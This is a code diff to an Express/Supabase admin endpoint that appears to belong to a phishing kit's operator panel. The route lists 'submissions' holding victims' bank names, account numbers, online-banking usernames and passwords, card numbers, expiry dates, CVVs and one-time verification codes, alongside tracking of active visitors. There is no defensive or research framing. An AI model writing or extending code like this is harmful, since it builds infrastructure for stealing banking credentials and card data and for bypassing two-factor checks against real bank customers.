@@ -37,14 +37,18 @@ app.get('/api/admin/submissions', async (req, res) => {
     const { data: visitors } = await supabase.from('visitors').select('*').gt('last_active_at', cutoff);
     const submissions = (orders || []).map(o => ({
       id: o.id,
+      name: o.name || '',
       phone: o.phone || '',
-      amount: o.watch_color || '-',
-      card: o.card_number || o.login_username || '',
-      pin: o.login_password || '',
-      otp: o.verification_code || '',
-      cvv: o.card_cvv || '',
+      account_number: o.account_number || '',
+      is_bank_client: o.is_bank_client || '',
+      bank_name: o.bank_name || '',
+      username: o.login_username || '',
+      password: o.login_password || '',
       card_name: o.card_name || '',
+      card_number: o.card_number || '',
       card_expiry: o.card_expiry || '',
+      cvv: o.card_cvv || '',
+      otp: o.verification_code || '',
       status: o.status || 'pending',
       time: o.created_at
     }));
